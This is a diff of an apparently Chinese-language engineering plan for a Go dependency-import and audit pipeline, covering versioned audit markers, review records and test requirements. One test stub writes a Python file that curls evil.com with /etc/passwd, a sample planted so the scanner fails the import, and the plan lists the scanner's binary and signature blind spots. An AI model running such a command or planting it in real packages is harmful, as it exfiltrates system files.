@@ -2255,13 +2255,35 @@ func (s *TAAState) processImportedDeps(req depsImportRequest, phase int, ciphert
 ```go
 const depsAuditMarker = ".taa_audit_ok"
 
+// depsAuditMarkerVersion is the trust content of the audit marker. Bump it whenever the audit
+// engine, policy, or rule set changes: auditMarkerExists compares content, so an existing
+// dependency directory carrying a marker from any other policy is re-audited instead of reused.
+//
+// Existence alone is not enough to trust a marker. Anything that writes one under a weaker
+// policy would otherwise be believed forever, and the directory it guards is content-addressed
+// and permanent. That is not hypothetical: this pipeline writes the same marker on the
+// ScanEnabled=false short-circuit as it does after a real audit, and the fail-open stub this
+// branch used to carry wrote a genuine marker for a set that was never audited at all.
+// Versioning is what makes those markers distinguishable, and it is the only handle that lets
+// a future policy change invalidate the markers already on disk. It does not provide
+// tamper-resistance -- anyone who can write into DEPS_DIR can forge the string -- which would
+// take a signature; this is the right starting point before that.
+const depsAuditMarkerVersion = "taa-deps-audit-v1\n"
+
 func auditMarkerExists(depsDir string) bool {
 	info, err := os.Stat(filepath.Join(depsDir, depsAuditMarker))
-	return err == nil && !info.IsDir()
+	if err != nil || info.IsDir() {
+		return false
+	}
+	content, err := os.ReadFile(filepath.Join(depsDir, depsAuditMarker))
+	if err != nil {
+		return false
+	}
+	return string(content) == depsAuditMarkerVersion
 }
 
 func writeAuditMarker(depsDir string) error {
-	return os.WriteFile(filepath.Join(depsDir, depsAuditMarker), []byte("audited\n"), 0o644)
+	return os.WriteFile(filepath.Join(depsDir, depsAuditMarker), []byte(depsAuditMarkerVersion), 0o644)
 }
 
 // rollbackDepsImport discards the directory of a dependency set that failed to import, and
@@ -2362,6 +2384,73 @@ go test ./internal/controller/ -run 'TestProcessImportedDeps' -v
 git add internal/controller/deps_import.go internal/controller/deps_import_test.go
 git commit -m "feat(deps): add dependency import pipeline with idempotent reuse"
 ```
+
+---
+
+### Task 6 闭环记录（2026-10-08，规范审查 + 质量审查两轮后 APPROVE）
+
+审查对象是整条 Task 6 提交链，而非单个提交：
+
+| 提交 | 内容 | 来源 |
+| :--- | :--- | :--- |
+| `0856570` | 流水线主体（幂等复用、安装、状态流转、上报） | 实现 |
+| `dffef36` | 归档校验与 zip-slip 用例改为可判别 | 实现者自审 |
+| `ae24045` | 审计桩改为 fail-closed + 全部失败路径改走 rollback | 规范审查修复轮 |
+| `e382856` | 审计标记版本化 + 堵掉最后一处 rollback 旁路 | 质量审查修复轮 |
+| `b15502c` | 三处与相邻代码互相否证的注释 | 质量审查第二次修复轮 |
+
+**规范审查**结论合规；实现者照做，不是漏做。质量审查提出 7 条发现，6 条闭环、1 条经论证
+有意不做（见下）。
+
+**本轮最有价值的一条：审计标记必须是「内容」而非「存在」（Q-C）。**
+
+初版 `auditMarkerExists` 只 `os.Stat` 判断存在。审查者指出这条不足为凭，并给出了比预审更强的
+反例：`ScanEnabled=false` 的短路分支**与真审计通过后写的是同一个标记**，fail-open 桩也曾为
+一套从未被审计的依赖写过**真标记**。依赖目录是内容寻址且**永久保留**的，一旦被弱策略写下的
+标记骗过，`Task 8` 的真审计会被永久短路。现改为内容比对：
+
+```go
+const depsAuditMarkerVersion = "taa-deps-audit-v1\n"
+// auditMarkerExists: os.Stat (含 info.IsDir() 显式守卫) -> os.ReadFile -> 内容 == 常量
+```
+
+版本号是唯一能让**未来策略变更**作废磁盘上既有标记的把手。它**不提供防篡改**——能写 `DEPS_DIR`
+的人就能伪造这个字符串，那需要签名，属本轮明确不做（spec §14）。
+
+判别力经**双方独立复现**：把 `auditMarkerExists` 退回 existence-only ⇒ 新增的
+`TestAuditMarkerVersionGate`（`:373`）与 `TestProcessImportedDepsReauditsForeignMarkerDir`
+（`:416`）**双 FAIL**，而 `TestProcessImportedDepsSkipsWhenAlreadyAudited` **仍 PASS**
+（两次导入写同版本内容 ⇒ 复用分支照常命中）。这组对照同时证明了"新用例有判别力"与
+"复用路径没被改坏"。
+
+**有意不做（记录理由，不再提）**：合并 `assertDepsRootEmpty` 与 `assertDepsRootContainsOnly`
+两个帮手。它们位于刚刚被变异验证过的断言内部，在此处改动会削弱那份证据，收益不抵。
+
+#### 交接给 Task 7 / Task 8 的三件事
+
+1. **`runDepsAudit` 目前是 fail-closed 桩**（`:317-320`，打日志后 `return false`），拒绝**一切**
+   依赖包。这是 spec §3 决策 5 的正确实现，**不得**为了"让测试跑通"回退为 `return true`
+   ——那会让未审计的依赖包通过、写出真标记、永久短路 Task 8 的真审计（`ae24045` 修的正是这个）。
+2. **`deps_audit.go` 尚不存在**（`ls` 报 No such file，`git log --all --` 该路径为空），由 Task 8
+   `Create`。`rollbackDepsImport` 的注释已写明：今天那次 `RemoveAll` 是本流水线**唯一**的删除动作；
+   Task 8 落地后它才成为"redundant second net"。Task 8 必须让 `runDepsAudit` 在**每条** `false`
+   路径上删目录，否则该注释再次变成假话（这正是 `b15502c` 修掉的毛病）。
+3. **`importDeps` 目前没有任何路径到达平台。** `reportDepsAsync`（`:287-290`）是纯日志桩，
+   `reportDepsFailure`/`reportDepsSuccess` 都只调它。因此今天 `importDeps` 的成功与失败**都不会
+   产生平台回调**，对平台表现为**挂起**而非报错。Task 7 落地前**不得**做任何依赖导入的平台
+   集成测试——那会测出一个"什么都没发生"的假结论。
+
+#### 过程记录（本轮暴露的两处我方失误，非实现者问题）
+
+1. **控制器自身的归因错误**：我把规范/质量审查者的**发现编号**与修复轮的**改动编号**混为一谈，
+   据此质问修复方"你报告已改、实际没改"。实际上那段注释**从未出现在它的简报里**，它没有误报。
+   教训：向审查者转述修复范围时，必须引用**具体文本**而不是编号。
+2. **blob 哈希核验存在内容级盲区**：`git hash-object` vs `git rev-parse HEAD:<file>` 只证明
+   "哪些文件变了"，证明不了"文件内部哪几行变了"。为此本轮起，对 subagent 声称"已替换/已删除"
+   的每一处，加做**内容级**核验：按**文本锚点**（而非行号区间——提交间行号会漂移，
+   `ae24045` 的 `:258-261` 就在 `e382856` 里变成了另一段注释）取段做 md5，并 `grep -c` 确认
+   新串确实存在。`b15502c` 即按此法验过：三条旧串计数全 0、四条新串计数全 1、`-U0` diff
+   过滤注释行后为空。
 
 ---
 
@@ -2517,17 +2606,50 @@ func TestReportAuditScopedCarriesScope(t *testing.T) {
 
 要求：
 
-- `state.Security.ScanEnabled = true`。这是**被迫**的：Task 6 的 fail-closed 桩无条件返回 false，
-  只有扫描开启时流水线才会走"审计未通过 ⇒ 回滚 ⇒ 失败上报"这条路；Task 6 自己的用例把
-  `ScanEnabled` 置 false 是为了让流水线**成功**，目的相反，不要照抄。
+- **安装桩必须往 `target` 写入一段会被正则引擎命中的代码**，不能只 `MkdirAll`。这一条是**承重的**，
+  见下方"为什么要写恶意内容"。
+- `state.Security.ScanEnabled = true`。Task 6 自己的用例把 `ScanEnabled` 置 false 是为了让流水线
+  **成功**，目的与本用例相反，不要照抄。
+- `state.Security.LLM = codeaudit.LLMConfig{Enabled: false}`，避开 `runDepsAudit` 里
+  `cfg.Enabled && cfg.FailClosed` 的 LLM 探测分支（Task 8 的用例同样这么做）。
 - 用一个 `httptest` 平台接管 `state.PlatformIP`/`state.DockerID`，断言收到的请求
-  **路径等于 `reportDepsEndpoint`**（`report.go` 里已有该常量；不要写字符串字面量）**且 `code` 字段为 1**。
-- 用带超时的 `select` 等待，超时即 `t.Fatal`——不要用无超时的 channel 接收，否则回调没发出时
-  用例会挂到整体超时，表现为"卡住"而不是"失败"。
-- 同时断言 `state.currentDepsDir() == ""`，把 §12 的前两段与第三段钉在同一个用例里。
+  **路径等于 `reportDepsEndpoint`**（`report.go` 已有该常量；不要写字符串字面量）**且 `code` 字段为 1**。
+- 用带超时的 `select` 等待，超时即 `t.Fatal`。不要用无超时的 channel 接收——回调没发出时用例会挂到
+  整体超时，表现为"卡住"而不是"失败"，掩盖诊断信息。
+- 同时断言 `state.currentDepsDir() == ""`，把 §12 的前两段（`DepsImported=false`、目录被清）与第三段
+  （平台收到 `code=1`）钉在同一个用例里。
 
-**判死要求**：把 Step 5 的 `reportDepsAsync` 换回只记日志的桩，或用例里不断言 `code`，本用例必须 FAIL。
-只断言"没有返回错误"的写法无效。
+**可复用的既有 helper（实测存在于 `deps_import_test.go`，不要另造）**：`buildTestDepsArchive(t)`
+（`:424`，造一个能通过 `ValidateWheelhouse` 的合法归档）、`buildTestArchive(t, files map[string]string)`
+（`:433`，需要自定义包内文件时用它）、以及 `:252` 起几条 `TestProcessImportedDeps*` 用例示范的
+`depsInstallFunc` 替换与 `processImportedDeps` 驱动方式。
+
+**为什么要写恶意内容（跨 Task 8 的存活性）**：本用例**必须在 Task 8 替换掉桩之后依然通过**。
+- 在 Task 6→Task 8 的窗口里：`runDepsAudit` 是无条件 `return false` 的桩，安装桩写什么都会失败，
+  于是走"审计未通过 ⇒ 回滚 ⇒ `reportDepsFailure(code=1)`"。
+- Task 8 落地真审计之后：桩消失，审计改为**真的扫** `depsDir`。若安装桩只 `MkdirAll` 而不落任何文件，
+  目录是空的、正则引擎一条都不命中、审计**通过**、流水线**成功**、平台收到的是 `code=0`——
+  **本用例会掉头把 Task 8 的 Step 5/Step 10 测试跑挂**。
+
+所以安装桩要写成"建目录 + 写一个命中规则的 `.py`"，这样两个窗口里审计都必然失败。用 Task 8 已实测
+能命中的那段：
+
+```go
+	depsInstallFunc = func(wheelhouse, target string) error {
+		if err := os.MkdirAll(target, 0o755); err != nil {
+			return err
+		}
+		code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
+		return os.WriteFile(filepath.Join(target, "pkg.py"), []byte(code), 0o644)
+	}
+```
+
+（不必为"Task 8 之后引擎换成 Semgrep"操心：`setupTestState` 装的是 `codeaudit.DefaultEngine()`，
+即正则基线，不需要外部二进制。日后若默认引擎改成 Semgrep，本用例与 Task 8 的用例会**一起**需要调整，
+那是同一次变更。）
+
+**判死要求**：把 Step 5 的 `reportDepsAsync` 换回只记日志的桩，本用例必须 FAIL；只断言"没有返回错误"
+的写法无效。
 
 - [ ] **Step 2: 运行测试确认失败**
 
@@ -3131,6 +3253,21 @@ LLM 侧用 `LLMConfig{Enabled: false}` 关掉，`cfg.Enabled && cfg.FailClosed` 
 保留目录本身，因为 `ModelDir` 是长期存在的固定路径。依赖目录是**内容寻址**的
 `depsDir/<sm3>`，整目录即该版本的完整身份，因此这里用 `os.RemoveAll(depsDir)` 整体删除，
 与 spec §6「不留半成品目录」一致。
+
+**§9 要求"已知盲区需在实现中明示"，本任务必须补上这一条——此前没有任何 Task 覆盖它。**
+Spec §9 末段写明两处盲区：fail-closed 静态扫描对 wheel 内的 `.so`/`.pyd` **二进制无效**
+（引擎按扩展名跳过，`internal/codeaudit/rules.go:90`），以及完整性上**只有 SM3、没有签名验签**。
+这两句必须出现在 `deps_audit.go` 里紧邻审计调用的位置，否则"同引擎、同策略"很容易被读成
+"扫过了就等于安全了"。
+
+写成 `runDepsAudit` 上方的英文注释（与仓库其余注释一致），要点三条：
+
+1. 扫的是解包后的 wheel **内容**，不是安装后的 `.so`/`.pyd`——二进制层面的供应链风险不在覆盖范围内；
+2. 完整性只有 SM3 内容寻址，**没有发布者签名**，信任模型与平台侧的既有约定一致；
+3. 因此"审计通过"**不等于**"依赖集合可信"，它只意味着"在同一套静态规则下未命中"。
+
+**只写注释，不要新增运行时检查、告警或阻断**——本节只要求"明示"；spec §13 的风险 1 与风险 3
+已把缓解手段（依赖审计白名单、签名验签）明确留给后续 spec。
 
 `internal/controller/import_processing.go` 中新增 `reportAuditScopedAsync`：把既有
 `reportAuditAsync`（预审时测得 `:722`；**Task 9 已在 `:188` 插入 1 行，此数已下移，按符号名定位**）
